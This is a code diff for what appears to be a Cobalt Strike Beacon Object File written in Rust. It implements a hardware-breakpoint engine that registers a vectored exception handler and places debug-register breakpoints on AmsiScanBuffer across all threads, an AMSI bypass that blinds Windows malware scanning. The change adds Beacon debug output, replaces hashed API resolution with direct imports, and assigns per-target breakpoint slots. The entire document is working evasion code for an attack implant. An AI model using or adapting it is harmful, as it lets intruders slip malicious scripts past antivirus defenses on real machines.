@@ -5,8 +5,19 @@ use opsec_peb::{resolve_export, resolve_module};
 use opsec_strcrypt::hash;
 use core::ffi::c_void;
 
+unsafe extern "C" { fn BeaconOutput(kind: i32, data: *const u8, len: i32); }
+macro_rules! bdbg {
+    ($msg:literal) => {{
+        let b: &[u8] = $msg;
+        unsafe { BeaconOutput(0x0D, b.as_ptr(), b.len() as i32); }
+    }}
+}
+
 use windows_sys::Win32::Foundation::{CloseHandle, INVALID_HANDLE_VALUE};
-use windows_sys::Win32::System::Diagnostics::Debug::{CONTEXT, CONTEXT_DEBUG_REGISTERS_AMD64};
+use windows_sys::Win32::System::Diagnostics::Debug::{
+    AddVectoredExceptionHandler, RemoveVectoredExceptionHandler,
+    CONTEXT, CONTEXT_DEBUG_REGISTERS_AMD64,
+};
 use windows_sys::Win32::System::Diagnostics::ToolHelp::{
     CreateToolhelp32Snapshot, Thread32First, Thread32Next, THREADENTRY32, TH32CS_SNAPTHREAD,
 };
@@ -36,27 +47,20 @@ pub struct HwbpGuard<'e> {
 impl HwbpEngine {
     pub unsafe fn init() -> Result<Self, Error> {
         unsafe {
+            bdbg!(b"[hwbp] bootstrap::init start\n");
             let bootstrap = Bootstrap::init().map_err(|_| Error::BootstrapFailed)?;
-
-            let kernel32 = resolve_module(hash!("kernel32.dll"))
-                .ok_or(Error::VehInstallFailed)?;
-            let add_veh = resolve_export(kernel32, hash!("AddVectoredExceptionHandler"))
-                .ok_or(Error::VehInstallFailed)?;
-
-            type AddVehFn = unsafe extern "system" fn(
-                u32,
-                unsafe extern "system" fn(*mut c_void) -> i32,
-            ) -> *mut c_void;
-            let add_veh: AddVehFn = core::mem::transmute(add_veh);
+            bdbg!(b"[hwbp] bootstrap::init ok\n");
 
             type DispatchFn = unsafe extern "system" fn(*mut c_void) -> i32;
             let dispatch_fn: DispatchFn = core::mem::transmute(
                 veh::dispatch as unsafe extern "system" fn(*mut _) -> i32,
             );
-            let veh_handle = add_veh(1, dispatch_fn);
+            bdbg!(b"[hwbp] calling AddVectoredExceptionHandler\n");
+            let veh_handle = AddVectoredExceptionHandler(1, Some(core::mem::transmute(dispatch_fn)));
             if veh_handle.is_null() {
                 return Err(Error::VehInstallFailed);
             }
+            bdbg!(b"[hwbp] VEH installed ok\n");
             Ok(HwbpEngine { veh_handle, bootstrap })
         }
     }
@@ -103,22 +107,21 @@ impl HwbpEngine {
                 .ok_or(Error::KernelHandleFailed)?;
             let targets = [
                 resolve_export(amsi, hash!("AmsiScanBuffer")),
-                resolve_export(amsi, hash!("AmsiScanString")),
-                resolve_export(amsi, hash!("AmsiOpenSession")),
             ];
             let mut first: Option<usize> = None;
-            for t in targets.into_iter().flatten() {
+            for (i, t) in targets.into_iter().flatten().enumerate() {
                 let addr = t as usize;
                 if first.is_none() {
                     first = Some(addr);
                 }
+                let slot = (i + 1) as u8;
                 veh::table().insert(Descriptor {
                     address: addr,
-                    slot: 1,
+                    slot,
                     thread_id: 0,
                     callback: CallbackKind::RipRet,
                 });
-                self.apply_breakpoint_to_all_threads(addr, 1, true)?;
+                self.apply_breakpoint_to_all_threads(addr, slot, true)?;
             }
             Ok(HwbpGuard {
                 engine: self,
@@ -243,15 +246,7 @@ impl Drop for HwbpEngine {
         }
         veh::table().clear();
         unsafe {
-            if let Some(k32) = resolve_module(hash!("kernel32.dll")) {
-                if let Some(rm) =
-                    resolve_export(k32, hash!("RemoveVectoredExceptionHandler"))
-                {
-                    type RmFn = unsafe extern "system" fn(*mut c_void) -> u32;
-                    let f: RmFn = core::mem::transmute(rm);
-                    f(self.veh_handle);
-                }
-            }
+            RemoveVectoredExceptionHandler(self.veh_handle);
         }
     }
 }
